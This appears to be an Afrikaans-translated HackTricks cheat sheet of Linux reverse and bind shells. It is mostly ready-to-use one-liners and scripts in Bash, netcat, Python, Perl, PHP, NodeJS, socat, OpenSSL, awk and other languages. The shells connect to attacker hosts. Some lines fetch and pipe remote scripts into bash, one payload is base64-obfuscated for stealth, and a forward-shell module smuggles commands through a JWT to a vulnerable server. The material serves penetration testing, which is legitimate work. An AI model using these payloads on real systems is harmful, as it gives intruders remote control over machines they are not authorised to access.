# Shells - Linux

{{#include ../../banners/hacktricks-training.md}}

**As jy vrae oor enige van hierdie shells het, kan jy dit nagaan by** [**https://explainshell.com/**](https://explainshell.com/).<sup>[[9]](#references)</sup>

## Full TTY

**Sodra jy 'n reverse shell verkry**[ **lees hierdie bladsy om 'n volledige TTY te verkry**](full-ttys.md)**.**

Die baseline reverse-shell payloads wat hieronder versamel is, word ook in die HighOn.Coffee- en PayloadsAllTheThings-cheat sheets gedokumenteer; verifieer die beskikbaarheid van die interpreter en utility op die target voordat jy een kies.<sup>[[1]](#references)[[4]](#references)</sup>

## Bash | sh
```bash
curl https://reverse-shell.sh/1.1.1.1:3000 | bash
bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1
bash -i >& /dev/udp/127.0.0.1/4242 0>&1 #UDP
0<&196;exec 196<>/dev/tcp/<ATTACKER-IP>/<PORT>; sh <&196 >&196 2>&196
exec 5<>/dev/tcp/<ATTACKER-IP>/<PORT>; while read line 0<&5; do $line 2>&5 >&5; done

#Short and bypass (credits to Dikline)
(sh)0>/dev/tcp/10.10.10.10/9091
#after getting the previous shell to get the output to execute
exec >&0
```
Moenie vergeet om met ander shells te toets nie: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh en bash.

### Shell wat simbole veilig hanteer
```bash
#If you need a more stable connection do:
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'

#Stealthier method
#B64 encode the shell like: echo "bash -c 'bash -i >& /dev/tcp/10.8.4.185/4444 0>&1'" | base64 -w0
echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMScK | base64 -d | bash 2>/dev/null
```
#### Shell-verduideliking

Die volgende punte som Bash se gedokumenteerde interaktiewe en redirection-gedrag op:<sup>[[10]](#references)[[11]](#references)</sup>

1. **`bash -i`**: Hierdie deel van die command begin ’n interaktiewe (`-i`) Bash-shell.
2. **`>&`**: Hierdie deel van die command is ’n kort notasie om **beide standard output** (`stdout`) en **standard error** (`stderr`) na die **selfde bestemming** te **redirect**.
3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Dit is ’n spesiale lêer wat **’n TCP-verbinding met die gespesifiseerde IP-adres en poort verteenwoordig**.
- Deur **die output- en error-streams na hierdie lêer te redirect**, stuur die command effektief die output van die interaktiewe shell-sessie na die aanvaller se masjien.
4. **`0>&1`**: Hierdie deel van die command **redirect standard input** (`stdin`) na dieselfde bestemming as standard output (`stdout`).

### Skep in lêer en voer uit
```bash
echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
```
## Forward Shell

Wanneer RCE beskikbaar is, maar ’n reverse shell deur ’n firewall, NAT of outbound filtering geblokkeer word, kan ’n forward shell oor die RCE-kanaal ’n semi-interaktiewe sessie verskaf.<sup>[[12]](#references)</sup>

’n Aanbevole tool hiervoor is [toboggan](https://github.com/n3rada/toboggan.git), wat ’n command-execution primitive in ’n interaktiewe sessie verpak.<sup>[[12]](#references)</sup>

Om toboggan te gebruik, skep ’n Python module wat aangepas is vir die RCE-konteks van jou teikensisteem; sy module-interface verwag ’n `execute(command, timeout)`-funksie wat command output terugstuur.<sup>[[12]](#references)</sup> Byvoorbeeld, ’n module genaamd `nix.py` kan soos volg gestruktureer word:
```python3
import jwt
import httpx

def execute(command: str, timeout: float = None) -> str:
# Generate JWT Token embedding the command, using space-to-${IFS} substitution for command execution
token = jwt.encode(
{"cmd": command.replace(" ", "${IFS}")}, "!rLsQaHs#*&L7%F24zEUnWZ8AeMu7^", algorithm="HS256"
)

response = httpx.get(
url="https://vulnerable.io:3200",
headers={"Authorization": f"Bearer {token}"},
timeout=timeout,
# ||BURP||
verify=False,
)

# Check if the request was successful
response.raise_for_status()

return response.text
```
Voer die module uit met toboggan se huidige command-line-vorm:<sup>[[12]](#references)</sup>
```shell
toboggan nix.py
```
Dit begin die interaktiewe sessie. Vir die ingeboude Burp Suite backend, gebruik `toboggan --request burp_request.xml`; vir 'n command-wrapper backend, gebruik `toboggan --exec-wrapper '<command_template>'`.<sup>[[12]](#references)</sup>

Nog 'n moontlikheid is die `IppSec` forward-shell-implementering [**https://github.com/IppSec/forward-shell**](https://github.com/IppSec/forward-shell).<sup>[[13]](#references)</sup>

Jy moet die volgende dele verander:<sup>[[13]](#references)</sup>

- Die URL van die kwesbare host
- Die prefix en suffix van jou payload (indien enige)
- Die manier waarop die payload gestuur word (headers? data? ekstra inligting?)

Daarna kan jy **commands stuur** of die **`upgrade` command** gebruik om 'n volledige PTY te kry; die implementering poll die output met 'n benaderde interval van 1,3 sekondes.<sup>[[13]](#references)</sup>

## Netcat
```bash
nc -e /bin/sh <ATTACKER-IP> <PORT>
nc <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKER-IP> <PORT> >/tmp/f
nc <ATTACKER-IP> <PORT1>| /bin/bash | nc <ATTACKER-IP> <PORT2>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | nc <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## BusyBox

BusyBox kombineer baie nutsprogramme in een klein uitvoerbare lêer en is algemeen op klein of ingebedde Linux-stelsels. As daar geen selfstandige `nc` is nie, kyk of BusyBox dit beskikbaar stel:<sup>[[8]](#references)[[19]](#references)</sup>
```bash
busybox --list-full | grep -E '(^|/)nc$'
busybox nc <ATTACKER-IP> <PORT> -e /bin/sh
busybox nc <ATTACKER-IP> <PORT> -e sh
```
As `busybox nc` bestaan maar interaktiewe uitvoering onbetroubaar is, pas die FIFO-patroon uit die `nc`-afdeling by daardie applet aan:<sup>[[2]](#references)[[8]](#references)</sup>
```bash
rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|busybox nc <ATTACKER-IP> <PORT> >/tmp/f
```
## gsocket

Gaan die amptelike ontplooiingsinstruksies na by [https://www.gsocket.io/deploy/](https://www.gsocket.io/deploy/).<sup>[[14]](#references)</sup>
```bash
bash -c "$(curl -fsSL gsocket.io/x)"
```
## Telnet
```bash
telnet <ATTACKER-IP> <PORT> | /bin/sh #Blind
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|telnet <ATTACKER-IP> <PORT> >/tmp/f
telnet <ATTACKER-IP> <PORT> | /bin/bash | telnet <ATTACKER-IP> <PORT>
rm -f /tmp/bkpipe;mknod /tmp/bkpipe p;/bin/sh 0</tmp/bkpipe | telnet <ATTACKER-IP> <PORT> 1>/tmp/bkpipe
```
## Whois

**Aanvaller**
```bash
while true; do nc -l <port>; done
```
Gebruik dieselfde Enter/CTRL+D-invoervolgorde wat in die Whois-afdeling beskryf word.<sup>[[3]](#references)</sup>

**Slagoffer**
```bash
export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
```
## Python
```bash
#Linux
export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
#IPv6
python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socket.SOCK_STREAM);s.connect(("dead:beef:2::125c",4343,0,2));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=pty.spawn("/bin/sh");'
```
## Perl
```bash
perl -e 'use Socket;$i="<ATTACKER-IP>";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"[IPADDR]:[PORT]");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```
## Ruby
```bash
ruby -rsocket -e'f=TCPSocket.open("10.0.0.1",1234).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("[IPADDR]","[PORT]");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```
## PHP
```php
// Using 'exec' is the most common method, but assumes that the file descriptor will be 3.
// Using this method may lead to instances where the connection reaches out to the listener and then closes.
php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'

// Using 'proc_open' makes no assumptions about what the file descriptor will be.
// See https://security.stackexchange.com/a/198944 for more information
<?php $sock=fsockopen("10.0.0.1",1234);$proc=proc_open("/bin/sh -i",array(0=>$sock, 1=>$sock, 2=>$sock), $pipes); ?>

<?php exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.8/4444 0>&1'"); ?>
```
## Java
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/ATTACKING-IP/80;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```
## Ncat
```bash
victim> ncat <ip> <port,eg.443> --ssl  -c  "bash -i 2>&1"
attacker> ncat -l <port,eg.443> --ssl
```
## Golang
```bash
echo 'package main;import"os/exec";import"net";func main(){c,_:=net.Dial("tcp","192.168.0.134:8080");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go
```
## Lua
```bash
#Linux
lua -e "require('socket');require('os');t=socket.tcp();t:connect('10.0.0.1','1234');os.execute('/bin/sh -i <&3 >&3 2>&3');"
#Windows & Linux
lua5.1 -e 'local host, port = "127.0.0.1", 4444 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, 'r') local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
```
## NodeJS
```javascript
(function(){
var net = require("net"),
cp = require("child_process"),
sh = cp.spawn("/bin/sh", []);
var client = new net.Socket();
client.connect(8080, "10.17.26.64", function(){
client.pipe(sh.stdin);
sh.stdout.pipe(client);
sh.stderr.pipe(client);
});
return /a/; // Prevents the Node.js application form crashing
})();


or

require('child_process').exec('nc -e /bin/sh [IPADDR] [PORT]')
require('child_process').exec("bash -c 'bash -i >& /dev/tcp/10.10.14.2/6767 0>&1'")

or

-var x = global.process.mainModule.require
-x('child_process').exec('nc [IPADDR] [PORT] -e /bin/bash')

or

// If you get to the constructor of a function you can define and execute another function inside a string
"".sub.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()
"".__proto__.constructor.constructor("console.log(global.process.mainModule.constructor._load(\"child_process\").execSync(\"id\").toString())")()


or

// Abuse this syntax to get a reverse shell
var fs = this.process.binding('fs');
var fs = process.binding('fs');

or

https://gitlab.com/0x4ndr3/blog/blob/master/JSgen/JSgen.py
```
## Zsh (ingeboude TCP)
```bash
# Requires no external binaries; leverages zsh/net/tcp module
zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPLY 2>&$REPLY'
```
## Rustcat (rcat)

[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – moderne netcat-agtige listener, geskryf in Rust.<sup>[[5]](#references)</sup>
```bash
# Attacker – interactive listener with history & tab-completion
rcat listen -ib 55600

# Victim – download a Linux release binary and connect back with /bin/bash
curl -L https://github.com/robiot/rustcat/releases/download/v3.0.0/rcat-v3.0.0-linux-x86_64 -o /tmp/rcat \
&& chmod +x /tmp/rcat \
&& /tmp/rcat connect -s /bin/bash <ATTACKER-IP> 55600
```
Kenmerke wat deur die projek gedokumenteer word:<sup>[[5]](#references)</sup>
- Command history en tab completion in interactive mode
- `-s` om die shell executable te kies wat deur `connect` gebruik word

## pwncat-cs

As jy reeds **enige raw reverse shell** het, maar ’n listener wil hê wat ’n meer bruikbare session kan opstel, kan `pwncat-cs` die connection hanteer en ’n remote PTY probeer opstel.<sup>[[7]](#references)</sup>
```bash
# Attacker - catch a plain reverse shell and auto-upgrade it when possible
python3 -m pip install --user pwncat-cs
pwncat-cs -lp 4444

# Victim - reuse any payload from this page
bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/4444 0>&1'
```
Dit ondersteun ook **geënkripteerde** `ssl-bind`- en `ssl-connect`-kanale, sodat jy dit met `ncat --ssl`- of `socat OPENSSL:`-payloads kan kombineer wanneer jy transport-enkripsie benodig.<sup>[[7]](#references)</sup>

## revsh (geënkripteer & pivot-gereed)

`revsh` is ’n klein C-kliënt/-bediener wat ’n volledige TTY oor ’n **geënkripteerde Diffie-Hellman-tonnel** verskaf en opsioneel aan ’n **TUN/TAP**-koppelvlak kan koppel vir omgekeerde VPN-agtige pivoting.<sup>[[6]](#references)</sup>
```bash
# Build after preparing the OpenSSL dependency as described in the repository README
git clone https://github.com/emptymonkey/revsh && cd revsh && make

# Attacker – controller/listener on 443
revsh -c 0.0.0.0:443

# Victim – reverse shell over the encrypted tunnel
./revsh <ATTACKER-IP>:443
```
Nuttige flags wat deur `revsh` gedokumenteer word, sluit in:<sup>[[6]](#references)</sup>
- `-b`: bind-shell mode (aktiveer dit aan albei kante)
- `-D [LHOST:]LPORT` of `-B [RHOST:]RPORT`: dynamic SOCKS 4/4a/5 forwarding
- `-x`: deaktiveer outomatiese opstelling van proxies, insluitend die verstek TUN/TAP-opstelling

Die encrypted tunnel voorkom dat shell-verkeer as plaintext blootgestel word, maar dit omseil nie network policy op sy eie nie.<sup>[[6]](#references)</sup>

## OpenSSL

Hierdie afdeling gebruik OpenSSL se `req`-, `s_server`- en `s_client`-commands om 'n certificate te skep en 'n shell oor TLS te dra.<sup>[[15]](#references)[[16]](#references)[[17]](#references)</sup>

Die Aanvaller (Kali)
```bash
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Generate certificate
openssl s_server -quiet -key key.pem -cert cert.pem -port <l_port>
```
Die Slagoffer
```bash
#Linux - one-port TLS shell using a named pipe
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s

#If the target needs SNI / hostname validation to blend with a fronted TLS service
mkfifo /tmp/.s; /bin/sh -i </tmp/.s 2>&1 | openssl s_client -quiet -servername <DOMAIN> -verify_return_error -verify_hostname <DOMAIN> -connect <ATTACKER_IP>:<PORT> >/tmp/.s; rm /tmp/.s
```
Jy kan steeds die klassieke **two-listener**-patroon gebruik wanneer jy geskeide invoer-/uitsetkanale wil hê.<sup>[[16]](#references)[[17]](#references)</sup>
```bash
#Linux
openssl s_client -quiet -connect <ATTACKER_IP>:<PORT1>|/bin/bash|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>

#Windows
openssl.exe s_client -quiet -connect <ATTACKER_IP>:<PORT1>|cmd.exe|openssl s_client -quiet -connect <ATTACKER_IP>:<PORT2>
```
## **Socat**

[https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries)

### Bind shell
```bash
victim> socat TCP-LISTEN:1337,reuseaddr,fork EXEC:bash,pty,stderr,setsid,sigint,sane
attacker> socat FILE:`tty`,raw,echo=0 TCP:<victim_ip>:1337
```
### Reverse shell
```bash
attacker> socat TCP-LISTEN:1337,reuseaddr FILE:`tty`,raw,echo=0
victim> socat TCP4:<attackers_ip>:1337 EXEC:bash,pty,stderr,setsid,sigint,sane
```
## Awk
```bash
awk 'BEGIN {s = "/inet/tcp/0/<IP>/<PORT>"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null
```
## Finger

**Aanvaller**
```bash
while true; do nc -l 79; done
```
Om die opdrag te stuur, skryf dit neer, druk enter en druk CTRL+D (om STDIN te stop).<sup>[[3]](#references)</sup>

**Slagoffer**
```bash
export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null')`; sleep 1; done

export X=Connected; while true; do X=`eval $(finger "$X"@<IP> 2> /dev/null | grep '!'|sed 's/^!//')`; sleep 1; done
```
## Gawk
```bash
#!/usr/bin/gawk -f

BEGIN {
Port    =       8080
Prompt  =       "bkd> "

Service = "/inet/tcp/" Port "/0/0"
while (1) {
do {
printf Prompt |& Service
Service |& getline cmd
if (cmd) {
while ((cmd |& getline) > 0)
print $0 |& Service
close(cmd)
}
} while (cmd != "exit")
close(Service)
}
}
```
## Xterm

Dit sal probeer om aan jou stelsel op poort 6001 te koppel.<sup>[[2]](#references)</sup>
```bash
xterm -display 10.0.0.1:1
```
Om die reverse shell op te vang, gebruik 'n X server wat op poort 6001 luister, soos hieronder getoon.<sup>[[2]](#references)</sup>
```bash
# Authorize host
xhost +targetip
# Listen
Xnest :1
```
## Groovy

deur [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76). LET WEL: Java reverse shell werk ook vir Groovy.<sup>[[18]](#references)</sup>
```bash
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```
## References

- [1] [Reverse Shell Cheat Sheet: PHP, ASP, Netcat, Bash & Python](https://highon.coffee/blog/reverse-shell-cheat-sheet/)
- [2] [Reverse Shell Cheat Sheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
- [3] [Gebruik van Whois en Finger vir Reverse Shells](https://tcm1911.github.io/posts/whois-and-finger-reverse-shell/)
- [4] [PayloadsAllTheThings - Reverse Shell Cheatsheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
- [5] [rustcat - Die moderne poortluisteraar en reverse shell](https://github.com/robiot/rustcat)
- [6] [revsh - 'n Reverse Shell met terminalondersteuning, datatonneling en gevorderde pivoting-vermoëns](https://github.com/emptymonkey/revsh)
- [7] [pwncat (pwncat-cs) - post-exploitation-platform](https://github.com/calebstewart/pwncat)
- [8] [busybox | GTFOBins](https://gtfobins.org/gtfobins/busybox/)
- [9] [explainshell.com](https://explainshell.com/)
- [10] [Bash Reference Manual: Herleidings](https://www.gnu.org/s/bash/manual/html_node/Redirections.html)
- [11] [Bash Reference Manual: Bash oproep](https://www.gnu.org/software/bash/manual/html_node/Invoking-Bash.html)
- [12] [toboggan](https://github.com/n3rada/toboggan)
- [13] [forward-shell](https://github.com/IppSec/forward-shell)
- [14] [Global Socket-ontplooiingsinstruksies](https://www.gsocket.io/deploy/)
- [15] [openssl-req](https://docs.openssl.org/4.0/man1/openssl-req/)
- [16] [openssl-s_server](https://docs.openssl.org/master/man1/openssl-s_server/)
- [17] [openssl-s_client](https://docs.openssl.org/master/man1/openssl-s_client/)
- [18] [Pure Groovy/Java Reverse Shell](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)
- [19] [BusyBox](https://busybox.net/about.html)
{{#include ../../banners/hacktricks-training.md}}
